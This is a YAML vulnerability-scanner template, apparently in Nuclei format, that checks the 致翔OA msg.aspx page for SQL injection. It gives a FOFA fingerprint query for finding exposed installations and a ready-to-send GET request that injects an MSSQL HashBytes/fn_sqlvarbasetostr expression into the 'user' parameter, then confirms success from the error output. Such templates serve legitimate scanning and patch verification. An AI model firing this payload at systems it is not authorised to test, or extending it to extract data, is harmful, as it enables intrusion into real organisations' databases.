id: poc-yaml-zxoa-msg-aspx-sqli
info:
  name: 致翔OA msg.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 致翔OA
    fofa: app="致翔软件-致翔OA"

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "/mainpage/msg.aspx?user=1'%20and%20(SELECT%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{t1}}')))=1%20and%20'1'='1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "nvarchar"
          - "{{t2}}"
